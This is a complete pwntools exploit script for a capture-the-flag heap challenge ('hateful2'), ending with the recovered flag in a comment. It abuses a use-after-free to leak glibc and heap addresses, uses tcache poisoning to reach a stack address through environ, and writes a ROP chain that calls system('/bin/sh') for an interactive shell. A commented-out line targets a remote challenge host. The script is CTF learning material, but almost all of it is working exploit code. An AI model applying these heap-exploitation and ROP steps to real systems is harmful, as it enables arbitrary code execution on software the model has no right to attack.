from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./hateful2_patched', '''
    b *(main+197)
    b *(main+209)      
    b *(main+221)
    b *(main+233)                    
    continue
''')

# p = remote('52.59.124.14', 5022)

def add_message(index, size, data):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Message Index: ", str(index).encode())
    p.sendlineafter(b"Message Size: ", str(size).encode())
    p.sendlineafter(b">> ", data)

def edit_message(index, data):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Message Index: ", str(index).encode())
    p.sendlineafter(b">> ", data)

def view_message(index):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Message Index: ", str(index).encode())
    p.recvuntil(b"Message: ")
    return p.recvuntil(b"\n\n", drop=True)

def remove_message(index):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"Message Index: ", str(index).encode())

# Stage 1: leak glibc base addres
add_message(0, 0x410+1, b'A'*0x410)
# avoid malloc_consolidate
add_message(1, 0x8+1, b'B'*0x8)
remove_message(0)
glibc_base_addr = (u64(view_message(0)[0:6].ljust(8, b'\x00'))&~0xfff)-0x1d2000
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: leak heap base address
remove_message(1)
heap_base_addr = ((u64(view_message(1)[0:5].ljust(8, b'\x00'))<<12)^0)& ~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 3: tcache poisoning to leak stack address in environ
glibc_e = ELF('./libc.so.6')
add_message(2, 0x410+1, b'C'*0x410)
add_message(3, 0x8+1, b'D'*0x8)
add_message(4, 0x8+1, b'E'*0x8)
remove_message(3)
remove_message(4)
edit_message(4, p64(((heap_base_addr+0x6e0)>>12)^(glibc_base_addr+glibc_e.sym.environ-0x10)))
add_message(5, 0x8+1, b'F'*0x8)
add_message(6, 0x10+1, b'G'*0x10)
stack_addr_in_environ = u64(view_message(6)[0x10:0x10+6].ljust(8, b'\x00'))
log.info(f"stack address in environ: {hex(stack_addr_in_environ)}")
# get the return address of add_message
add_message_return_addr = stack_addr_in_environ-0x140

# Stage 4: tcache poisoning to ROP to pop a shell
add_message(7, 0x28+1, b'H'*0x28)
add_message(8, 0x28+1, b'I'*0x28)
remove_message(7)
remove_message(8)
edit_message(8, p64(((heap_base_addr+0x740)>>12)^(add_message_return_addr-0x8)))
add_message(9, 0x28+1, b'J'*0x28)
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
add_message(10, 0x28+1, b'K'*0x8+b''.join([p64(addr) for addr in chain]))

p.interactive()

# ENO{W3_4R3_50RRY_4G41N_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}